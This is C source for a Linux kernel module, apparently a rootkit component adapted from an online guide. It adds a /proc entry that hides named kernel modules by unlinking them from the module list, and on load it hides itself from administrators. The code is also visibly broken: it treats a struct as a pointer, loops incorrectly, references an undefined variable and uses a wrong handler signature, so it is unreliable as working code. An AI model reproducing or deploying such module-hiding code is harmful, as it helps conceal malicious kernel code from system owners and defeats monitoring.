#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/klist.h>

MODULE_LICENSE("GPL");

struct module;
struct list_head;
struct module_kobject;

//this module code was found from the site given in the resources 
//http://www.ouah.org/spacelkm.txt and adapted for our own use
int hide_module(char *name)
{
    //get a reference to the module specified
    struct module *hidemod;
    hidemod = find_module(name);

    if (hidemod == NULL){return -1;} //make sure we aren't doing any NULL pointer operations ourselves
    
    //grab the list_head struct from it
    struct list_head *list;
    list = hidemod->list;

    //make a copy
    struct list_head *p;
    p = list;
    //iterate over the list
    while (p != hidemod->list && p->next != NULL)
    {
        p = p->next;
    }
    //if we reach the end, stop
    //if we reach the desired module, unlink it from the linked list
    if (p == hidemod->list){p->prev->next = p->next;}
    if (p->next == NULL){return -1;}
    return 0;
}

void proc_write()
{

    //simply call the hid module function
    hide_module(name);
}

int init_module(void)
{
    //this module will create a /proc fs entry that when written to will hide the specified module
    struct proc_dir_entry *My_Proc_File;
    My_Proc_File = create_proc_entry("hidemod", 0644, NULL);

    My_Proc_File->write_proc = proc_write;
    My_Proc_File->mode = S_IFREG |S_IRUGO;
    My_Proc_File->uid = 0;
    My_Proc_File->size = 0;
    
    //we then get a reference to this module
    struct module *self;
    self = THIS_MODULE;
    //and we tell this module to hide itself
    hide_module(self->name);

    return 0;
}

void cleanup_module(void)
{
    remove_proc_entry("hidemod", NULL);
}
